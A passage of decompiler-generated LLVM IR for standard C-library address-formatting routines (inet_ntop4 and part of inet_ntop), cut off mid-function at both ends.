  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_e7b0 ], [ %stack_var_-56.0.be, %dec_label_pc_e890.backedge ]
  %v4_e8a03 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_e8a03, i32* %r3.global-to-local, align 4
  %v2_e8a4 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_e910.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_e8a4, label %dec_label_pc_e8cc, label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %dec_label_pc_e8a0
  %v1_e8ac = add i32 %v0_e910.pre.pre, 2
  store i32 %v1_e8ac, i32* %r3.global-to-local, align 4
  %v1_e8b0 = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_e8ac, %v1_e8b0
  br i1 %tmp40, label %dec_label_pc_e944, label %dec_label_pc_e8b8

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e8ac
  store i32 %v0_e910.pre.pre, i32* %r3.global-to-local, align 4
  %v0_e8bc = load i32, i32* %r7.global-to-local, align 4
  %v3_e8bc = udiv i32 %v0_e8bc, 256
  store i32 %v3_e8bc, i32* %r2.global-to-local, align 4
  %v1_e8c0 = trunc i32 %v3_e8bc to i8
  %v3_e8c0 = inttoptr i32 %v0_e910.pre.pre to i8*
  store i8 %v1_e8c0, i8* %v3_e8c0, align 1
  %v4_e8c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_e8c0 = add i32 %v4_e8c0, 1
  store i32 %v5_e8c0, i32* %r3.global-to-local, align 4
  %v0_e8c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e8c4 = trunc i32 %v0_e8c4 to i8
  %v2_e8c4 = load i32, i32* @r4, align 4
  %v3_e8c4 = add i32 %v2_e8c4, 1
  %v4_e8c4 = inttoptr i32 %v3_e8c4 to i8*
  store i8 %v1_e8c4, i8* %v4_e8c4, align 1
  %v0_e8c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e8c8 = add i32 %v0_e8c8, 1
  store i32 %v1_e8c8, i32* @r4, align 4
  br label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e8a0, %bb, %dec_label_pc_e8b8
  %v0_e910.pre = phi i32 [ %v5_e87c, %bb ], [ %v1_e8c8, %dec_label_pc_e8b8 ], [ %v0_e910.pre.pre, %dec_label_pc_e8a0 ]
  %v0_e8cc = load i32, i32* %fp.global-to-local, align 4
  %v2_e8cc = icmp eq i32 %v0_e8cc, 0
  %v1_e910.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_e8cc, label %dec_label_pc_e910, label %dec_label_pc_e8d4

dec_label_pc_e8d4:                                ; preds = %dec_label_pc_e8cc
  %v9_e8d4 = icmp eq i32 %v0_e910.pre, %v1_e910.pre
  %v2_e8d8 = sub i32 %v0_e910.pre, %v0_e8cc
  store i32 %v2_e8d8, i32* %r0.global-to-local, align 4
  br i1 %v9_e8d4, label %dec_label_pc_e944, label %dec_label_pc_e8f8.preheader

dec_label_pc_e8f8.preheader:                      ; preds = %dec_label_pc_e8d4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e8f8

dec_label_pc_e8e8:                                ; preds = %dec_label_pc_e8f8
  %v0_e8e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_e8e8 = add i32 %v0_e8e8, %v2_e8fc
  %v3_e8e8 = inttoptr i32 %v2_e8e8 to i8*
  %v4_e8e8 = load i8, i8* %v3_e8e8, align 1
  %v3_e8ec = inttoptr i32 %v2_e900 to i8*
  store i8 %v4_e8e8, i8* %v3_e8ec, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e8f4 = load i32, i32* %fp.global-to-local, align 4
  %v3_e8f4 = load i32, i32* %ip.global-to-local, align 4
  %v4_e8f4 = add i32 %v3_e8f4, %v2_e8f4
  %v5_e8f4 = inttoptr i32 %v4_e8f4 to i8*
  store i8 0, i8* %v5_e8f4, align 1
  %v0_e8f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e8f8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_e900.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %dec_label_pc_e8f8.preheader, %dec_label_pc_e8e8
  %v0_e90c = phi i32 [ %v1_e910.pre, %dec_label_pc_e8f8.preheader ], [ %v1_e900.pre, %dec_label_pc_e8e8 ]
  %v1_e8fc = phi i32 [ %v2_e8d8, %dec_label_pc_e8f8.preheader ], [ %v1_e8f8.pre, %dec_label_pc_e8e8 ]
  %v0_e904 = phi i32 [ 1, %dec_label_pc_e8f8.preheader ], [ %v0_e8f8.pre, %dec_label_pc_e8e8 ]
  %v2_e8fc = sub i32 %v1_e8fc, %v0_e904
  store i32 %v2_e8fc, i32* %ip.global-to-local, align 4
  %v2_e900 = sub i32 %v0_e90c, %v0_e904
  store i32 %v2_e900, i32* @lr, align 4
  %v1_e904 = add i32 %v0_e904, 1
  store i32 %v1_e904, i32* %r2.global-to-local, align 4
  %v7_e908 = icmp slt i32 %v1_e8fc, %v0_e904
  br i1 %v7_e908, label %dec_label_pc_e90c, label %dec_label_pc_e8e8

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e8f8
  store i32 %v0_e90c, i32* @r4, align 4
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_e8cc, %dec_label_pc_e90c
  %v0_e910 = phi i32 [ %v0_e90c, %dec_label_pc_e90c ], [ %v0_e910.pre, %dec_label_pc_e8cc ]
  %v1_e910 = phi i32 [ %v0_e90c, %dec_label_pc_e90c ], [ %v1_e910.pre, %dec_label_pc_e8cc ]
  %v9_e910 = icmp eq i32 %v0_e910, %v1_e910
  br i1 %v9_e910, label %dec_label_pc_e918, label %dec_label_pc_e944

dec_label_pc_e918:                                ; preds = %dec_label_pc_e910
  store i32 16, i32* @r2, align 4
  %v2_e91c = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_e91c, i32* @r0, align 4
  store i32 %v2_e780, i32* @r1, align 4
  %v0_e924 = call i32 @memcpy()
  store i32 %v0_e924, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e948

dec_label_pc_e930:                                ; preds = %dec_label_pc_e760
  %v0_e930 = call i32 @__errno_location()
  store i32 %v0_e930, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e93c = inttoptr i32 %v0_e930 to i32*
  store i32 97, i32* %v2_e93c, align 4
  %v0_e948.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e948

dec_label_pc_e944:                                ; preds = %dec_label_pc_e7e0, %dec_label_pc_e808, %dec_label_pc_e828, %dec_label_pc_e81c, %dec_label_pc_e86c, %dec_label_pc_e8d4, %dec_label_pc_e858, %dec_label_pc_e910, %dec_label_pc_e7a4, %dec_label_pc_e8ac, %dec_label_pc_e860
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e948

dec_label_pc_e948:                                ; preds = %dec_label_pc_e930, %dec_label_pc_e918, %dec_label_pc_e76c, %dec_label_pc_e944
  %v0_e948 = phi i32 [ %v0_e948.pre, %dec_label_pc_e930 ], [ 1, %dec_label_pc_e918 ], [ %v4_e774, %dec_label_pc_e76c ], [ 0, %dec_label_pc_e944 ]
  store i32 %v0_e948, i32* %r0.global-to-local, align 4
  store i32 %v3_e748, i32* @r4, align 4
  store i32 %v6_e748, i32* @r5, align 4
  store i32 %v9_e748, i32* @r6, align 4
  ret i32 %v0_e948

; uselistorder directives
  uselistorder i32 %v0_e948, { 1, 0 }
  uselistorder i32 %v2_e900, { 1, 0 }
  uselistorder i32 %v2_e8fc, { 1, 0 }
  uselistorder i32 %v0_e904, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e90c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e910.pre, { 0, 2, 1 }
  uselistorder i32 %v0_e910.pre, { 2, 0, 1 }
  uselistorder i32 %v3_e8bc, { 1, 0 }
  uselistorder i32 %v0_e910.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_e894, { 1, 2, 3, 0 }
  uselistorder i32 %v0_e870, { 1, 0 }
  uselistorder i32 %v3_e834, { 1, 0 }
  uselistorder i32 %v0_e828, { 1, 0, 2 }
  uselistorder i32 %v1_e7d8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_e7d0, { 1, 0 }
  uselistorder i32 %v0_e7b4, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 11, 10, 7, 6, 9, 8, 17, 16, 13, 12, 15, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 58, { 3, 0, 1, 2 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_e948, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e944, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_e910, { 1, 0 }
  uselistorder label %dec_label_pc_e8f8, { 1, 0 }
  uselistorder label %dec_label_pc_e8cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e890.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e7c4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e958 = load i32, i32* @r4, align 4
  store i32 %v3_e958, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_12524.338 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_e974 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_e974, i32* @r0, align 4
  %v0_e978 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_e988 = bitcast i32* %stack_var_-51 to i8*
  %v3_e988 = call i32 @__GI_memset(i8* %v2_e988, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_ea50 = ptrtoint i32* %stack_var_-36 to i32
  %v2_ea2c = add i32 %v2_ea50, -17
  br label %dec_label_pc_ea50

dec_label_pc_e998:                                ; preds = %dec_label_pc_ea50
  %v0_e998 = load i32, i32* %fp.global-to-local, align 4
  %v2_e998 = add i32 %v0_e998, %v1_e998
  %v3_e998 = inttoptr i32 %v2_e998 to i8*
  %v4_e998 = load i8, i8* %v3_e998, align 1
  %v6_e998 = zext i8 %v4_e998 to i32
  store i32 %v6_e998, i32* %r4.global-to-local, align 4
  %v1_e99c = add i32 %v0_e99c, 1
  store i32 %v1_e99c, i32* %r7.global-to-local, align 4
  store i32 %v2_ea50, i32* %r2.global-to-local, align 4
  %v2_e9a8 = add i32 %v1_e99c, %v2_ea50
  store i32 %v2_e9a8, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_e998, 100
  %v1_e9b0 = or i8 %div, 48
  %v3_e9b4 = add i32 %v2_ea60, -17
  %v4_e9b4 = inttoptr i32 %v3_e9b4 to i8*
  store i8 %v1_e9b0, i8* %v4_e9b4, align 1
  %v0_e9b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_e9b8 = add i32 %v0_e9b8, -17
  %v2_e9b8 = inttoptr i32 %v1_e9b8 to i8*
  %v3_e9b8 = load i8, i8* %v2_e9b8, align 1
  %v7_e9bc = icmp eq i8 %v3_e9b8, 48
  %v0_e9c0 = load i32, i32* %fp.global-to-local, align 4
  %v1_e9c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_e9c0 = add i32 %v1_e9c0, %v0_e9c0
  store i32 %v2_e9c0, i32* %sb.global-to-local, align 4
  %v0_e9c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_e9d0 = udiv i32 %v0_e9c8, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_e9d8 = urem i32 %v2_e9d0, 256
  %v2_e9dc = urem i32 %v1_e9d8, 10
  %v1_e9e0 = or i32 %v2_e9dc, 48
  %v1_e9e4 = trunc i32 %v1_e9e0 to i8
  br i1 %v7_e9bc, label %dec_label_pc_e9d0, label %dec_label_pc_e9f8

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e998
  store i8 %v1_e9e4, i8* %v2_e9b8, align 1
  %v0_e9e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_e9e8 = add i32 %v0_e9e8, -17
  %v2_e9e8 = inttoptr i32 %v1_e9e8 to i8*
  %v3_e9e8 = load i8, i8* %v2_e9e8, align 1
  %v7_e9ec = icmp eq i8 %v3_e9e8, 48
  br i1 %v7_e9ec, label %dec_label_pc_e9d0.dec_label_pc_ea1c_crit_edge, label %bb

dec_label_pc_e9d0.dec_label_pc_ea1c_crit_edge:    ; preds = %dec_label_pc_e9d0
  %v1_ea2c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ea1c

bb:                                               ; preds = %dec_label_pc_e9d0
  %v1_e9f0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_e9f0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ea1c

dec_label_pc_e9f8:                                ; preds = %dec_label_pc_e998
  %v2_ea14 = load i32, i32* %sl.global-to-local, align 4
  %v3_ea14 = add i32 %v2_ea14, -17
  %v4_ea14 = inttoptr i32 %v3_ea14 to i8*
  store i8 %v1_e9e4, i8* %v4_ea14, align 1
  %v0_ea18 = load i32, i32* %r7.global-to-local, align 4
  %v1_ea18 = add i32 %v0_ea18, 1
  store i32 %v1_ea18, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ea1c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_e9d0.dec_label_pc_ea1c_crit_edge, %bb, %dec_label_pc_e9f8
  %v1_ea2c = phi i32 [ %v1_ea2c.pre, %dec_label_pc_e9d0.dec_label_pc_ea1c_crit_edge ], [ %v1_e9f0, %bb ], [ %v1_ea18, %dec_label_pc_e9f8 ]
  %v0_ea1c = load i32, i32* %sb.global-to-local, align 4
  %v1_ea1c = inttoptr i32 %v0_ea1c to i8*
  %v2_ea1c = load i8, i8* %v1_ea1c, align 1
  %tmp17 = urem i8 %v2_ea1c, 10
  store i32 %v2_ea50, i32* %ip.global-to-local, align 4
  %v1_ea30 = add i32 %v1_ea2c, 1
  store i32 %v1_ea30, i32* %r1.global-to-local, align 4
  %v1_ea34 = or i8 %tmp17, 48
  %v3_ea38 = add i32 %v2_ea2c, %v1_ea2c
  %v4_ea38 = inttoptr i32 %v3_ea38 to i8*
  store i8 %v1_ea34, i8* %v4_ea38, align 1
  %v0_ea3c = load i32, i32* %ip.global-to-local, align 4
  %v1_ea3c = load i32, i32* %r1.global-to-local, align 4
  %v2_ea3c = add i32 %v1_ea3c, %v0_ea3c
  store i32 %v2_ea3c, i32* %r2.global-to-local, align 4
  %v3_ea44 = add i32 %v2_ea3c, -17
  %v4_ea44 = inttoptr i32 %v3_ea44 to i8*
  store i8 46, i8* %v4_ea44, align 1
  %v0_ea48 = load i32, i32* %r8.global-to-local, align 4
  %v1_ea48 = add i32 %v0_ea48, 1
  store i32 %v1_ea48, i32* %r8.global-to-local, align 4
  %v0_ea4c = load i32, i32* %r1.global-to-local, align 4
  %v1_ea4c = add i32 %v0_ea4c, 1
  br label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %entry, %dec_label_pc_ea1c
  %v0_e99c = phi i32 [ 0, %entry ], [ %v1_ea4c, %dec_label_pc_ea1c ]
  %v1_e998 = phi i32 [ 0, %entry ], [ %v1_ea48, %dec_label_pc_ea1c ]
  store i32 %v2_ea50, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_e99c, i32* %r6.global-to-local, align 4
  %v2_ea60 = add i32 %v0_e99c, %v2_ea50
  store i32 %v2_ea60, i32* %r5.global-to-local, align 4
  %v7_ea64 = icmp sgt i32 %v1_e998, 3
  br i1 %v7_ea64, label %dec_label_pc_ea68, label %dec_label_pc_e998

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea50
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_e974, i32* %r4.global-to-local, align 4
  %v3_ea70 = add i32 %v2_ea60, -18
  %v4_ea70 = inttoptr i32 %v3_ea70 to i8*
  store i8 0, i8* %v4_ea70, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_ea78 = call i32 @strlen(i8* %tmp18)
  %v2_ea7c = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_ea78, %v2_ea7c
  br i1 %tmp, label %dec_label_pc_ea88, label %dec_label_pc_ea9c

dec_label_pc_ea88:                                ; preds = %dec_label_pc_ea68
  %v0_ea88 = call i32 @__errno_location()
  %v0_ea90 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ea90, i32* %r2.global-to-local, align 4
  %v2_ea94 = inttoptr i32 %v0_ea88 to i32*
  store i32 28, i32* %v2_ea94, align 4
  %v0_eaac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eaac

dec_label_pc_ea9c:                                ; preds = %dec_label_pc_ea68
  store i32 %v2_e974, i32* %r1.global-to-local, align 4
  %v3_eaa4 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_eaa4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eaac

dec_label_pc_eaac:                                ; preds = %dec_label_pc_ea88, %dec_label_pc_ea9c
  %v0_eaac = phi i32 [ %v0_eaac.pre, %dec_label_pc_ea88 ], [ %v3_eaa4, %dec_label_pc_ea9c ]
  %v2_eab4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_eab4, i32* @r4, align 4
  ret i32 %v0_eaac

; uselistorder directives
  uselistorder i32 %v2_ea60, { 0, 2, 1 }
  uselistorder i32 %v1_e998, { 1, 0 }
  uselistorder i32 %v0_e99c, { 0, 2, 1 }
  uselistorder i32 %v2_ea50, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_eaac, { 1, 0 }
  uselistorder label %dec_label_pc_ea50, { 1, 0 }
  uselistorder label %dec_label_pc_ea1c, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_eabc = load i32, i32* @r4, align 4
  store i32 %v3_eabc, i32* %stack_var_-32, align 4
  %v6_eabc = load i32, i32* @r5, align 4
  %v25_eabc = ptrtoint i32* %stack_var_-32 to i32
  %v7_eac0 = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_eac0, label %dec_label_pc_eae4, label %dec_label_pc_ead8

dec_label_pc_ead8:                                ; preds = %entry
  %v7_ead8 = icmp eq i32 %arg1, 10
  br i1 %v7_ead8, label %dec_label_pc_eaf8, label %dec_label_pc_ecf8

dec_label_pc_eae4:                                ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_eaf0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_ecf0

dec_label_pc_eaf8:                                ; preds = %dec_label_pc_ead8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_eb04 = bitcast i32* %stack_var_-64 to i8*
  %v3_eb04 = call i32 @__GI_memset(i8* %v2_eb04, i32 0)
  br label %dec_label_pc_eb24

dec_label_pc_eb10:                                ; preds = %dec_label_pc_eb24
  %tmp68 = icmp slt i32 %v1_eb14, 0
  %v4_eb24 = zext i1 %tmp68 to i32
  %v5_eb24 = add i32 %v4_eb24, %v1_eb14
  %v3_eb28 = sdiv i32 %v5_eb24, 2
  %v4_eb38 = mul i32 %v3_eb28, 4
  %v5_eb38 = add i32 %v4_eb38, %v25_eabc
  %v1_eb10 = add i32 %v2_eb34, 1
  %v2_eb10 = inttoptr i32 %v1_eb10 to i8*
  %v3_eb10 = load i8, i8* %v2_eb10, align 1
  %v4_eb10 = zext i8 %v3_eb10 to i32
  %v3_eb14 = inttoptr i32 %v2_eb34 to i8*
  %v4_eb14 = load i8, i8* %v3_eb14, align 1
  %v6_eb14 = zext i8 %v4_eb14 to i32
  store i32 %v6_eb14, i32* %r2.global-to-local, align 4
  %v4_eb18 = mul nuw nsw i32 %v6_eb14, 256
  %v5_eb18 = or i32 %v4_eb18, %v4_eb10
  %v2_eb1c = add i32 %v5_eb38, -32
  %v3_eb1c = inttoptr i32 %v2_eb1c to i32*
  store i32 %v5_eb18, i32* %v3_eb1c, align 4
  %v0_eb20 = load i32, i32* %r1.global-to-local, align 4
  %v1_eb20 = add i32 %v0_eb20, 2
  br label %dec_label_pc_eb24

dec_label_pc_eb24:                                ; preds = %dec_label_pc_eaf8, %dec_label_pc_eb10
  %v1_eb14 = phi i32 [ 0, %dec_label_pc_eaf8 ], [ %v1_eb20, %dec_label_pc_eb10 ]
  store i32 %v1_eb14, i32* %r1.global-to-local, align 4
  %v0_eb34 = load i32, i32* @r8, align 4
  %v2_eb34 = add i32 %v0_eb34, %v1_eb14
  store i32 %v2_eb34, i32* %r2.global-to-local, align 4
  %v7_eb3c = icmp sgt i32 %v1_eb14, 15
  br i1 %v7_eb3c, label %dec_label_pc_eb40, label %dec_label_pc_eb10

dec_label_pc_eb40:                                ; preds = %dec_label_pc_eb24
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %dec_label_pc_eb40, %dec_label_pc_eb9c
  %v0_eb90 = phi i32 [ -1, %dec_label_pc_eb40 ], [ %v0_ebc4, %dec_label_pc_eb9c ]
  %v0_eb80 = phi i32 [ -1, %dec_label_pc_eb40 ], [ %v0_ebb0, %dec_label_pc_eb9c ]
  %v0_eb64 = phi i32 [ -1, %dec_label_pc_eb40 ], [ %v0_eb648, %dec_label_pc_eb9c ]
  %v0_eb9c = phi i32 [ 0, %dec_label_pc_eb40 ], [ %v1_eb9c, %dec_label_pc_eb9c ]
  %v4_eb54 = mul nuw nsw i32 %v0_eb9c, 4
  %v5_eb54 = add i32 %v4_eb54, %v25_eabc
  %v1_eb58 = add i32 %v5_eb54, -32
  %v2_eb58 = inttoptr i32 %v1_eb58 to i32*
  %v3_eb58 = load i32, i32* %v2_eb58, align 4
  %v2_eb5c = icmp eq i32 %v3_eb58, 0
  %v7_eb64 = icmp eq i32 %v0_eb64, -1
  br i1 %v2_eb5c, label %dec_label_pc_eb64, label %dec_label_pc_eb78

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb50
  br i1 %v7_eb64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_eb64
  store i32 %v0_eb9c, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_eb9c

.thread:                                          ; preds = %dec_label_pc_eb64
  %v1_eb70.pre = load i32, i32* @r4, align 4
  %v2_eb70 = add i32 %v1_eb70.pre, 1
  store i32 %v2_eb70, i32* @r4, align 4
  br label %dec_label_pc_eb9c

dec_label_pc_eb78:                                ; preds = %dec_label_pc_eb50
  br i1 %v7_eb64, label %dec_label_pc_eb9c, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb78
  %v7_eb80 = icmp eq i32 %v0_eb80, -1
  %v0_eb94.pre = load i32, i32* @r4, align 4
  %v1_eb88 = load i32, i32* @r7, align 4
  %v7_eb8c = icmp sgt i32 %v0_eb94.pre, %v1_eb88
  %or.cond = or i1 %v7_eb80, %v7_eb8c
  br i1 %or.cond, label %dec_label_pc_eb90, label %dec_label_pc_eb98

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb80
  store i32 %v0_eb90, i32* @r6, align 4
  store i32 %v0_eb94.pre, i32* @r7, align 4
  br label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb80, %dec_label_pc_eb90
  %v0_eb8013 = phi i32 [ %v0_eb90, %dec_label_pc_eb90 ], [ %v0_eb80, %dec_label_pc_eb80 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eb9c

dec_label_pc_eb9c:                                ; preds = %bb, %.thread, %dec_label_pc_eb78, %dec_label_pc_eb98
  %v0_ebc4 = phi i32 [ %v0_eb90, %.thread ], [ %v0_eb9c, %bb ], [ %v0_eb90, %dec_label_pc_eb78 ], [ -1, %dec_label_pc_eb98 ]
  %v0_eb648 = phi i32 [ %v0_eb64, %.thread ], [ %v0_eb9c, %bb ], [ -1, %dec_label_pc_eb78 ], [ -1, %dec_label_pc_eb98 ]
  %v0_ebb0 = phi i32 [ %v0_eb80, %.thread ], [ %v0_eb80, %bb ], [ %v0_eb80, %dec_label_pc_eb78 ], [ %v0_eb8013, %dec_label_pc_eb98 ]
  %v1_eb9c = add nuw nsw i32 %v0_eb9c, 1
  store i32 %v1_eb9c, i32* %r1.global-to-local, align 4
  %v7_eba4 = icmp slt i32 %v1_eb9c, 8
  br i1 %v7_eba4, label %dec_label_pc_eb50, label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb9c
  %v7_eba8 = icmp eq i32 %v0_ebc4, -1
  br i1 %v7_eba8, label %dec_label_pc_ebc8, label %dec_label_pc_ebb0

dec_label_pc_ebb0:                                ; preds = %dec_label_pc_eba8
  %v7_ebb0 = icmp eq i32 %v0_ebb0, -1
  %v0_ebc0.pre = load i32, i32* @r4, align 4
  br i1 %v7_ebb0, label %dec_label_pc_ebc0, label %dec_label_pc_ebb8

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_ebb0
  %v1_ebb8 = load i32, i32* @r7, align 4
  %v7_ebbc = icmp sgt i32 %v0_ebc0.pre, %v1_ebb8
  br i1 %v7_ebbc, label %dec_label_pc_ebc0, label %dec_label_pc_ebc8

dec_label_pc_ebc0:                                ; preds = %dec_label_pc_ebb0, %dec_label_pc_ebb8
  store i32 %v0_ebc0.pre, i32* @r7, align 4
  store i32 %v0_ebc4, i32* @r6, align 4
  br label %dec_label_pc_ebc8

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_ebb8, %dec_label_pc_eba8, %dec_label_pc_ebc0
  %v0_ebc8 = phi i32 [ %v0_ebb0, %dec_label_pc_ebb8 ], [ %v0_ebb0, %dec_label_pc_eba8 ], [ %v0_ebc4, %dec_label_pc_ebc0 ]
  %v7_ebc8 = icmp eq i32 %v0_ebc8, -1
  br i1 %v7_ebc8, label %bb49, label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_ebc8
  %v0_ebd0 = load i32, i32* @r7, align 4
  %v7_ebd4 = icmp slt i32 %v0_ebd0, 2
  br i1 %v7_ebd4, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_ebd0
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_ebc8, %dec_label_pc_ebd0, %bb48
  %v0_ebe423 = phi i32 [ %v0_ebc8, %dec_label_pc_ebc8 ], [ %v0_ebc8, %dec_label_pc_ebd0 ], [ -1, %bb48 ]
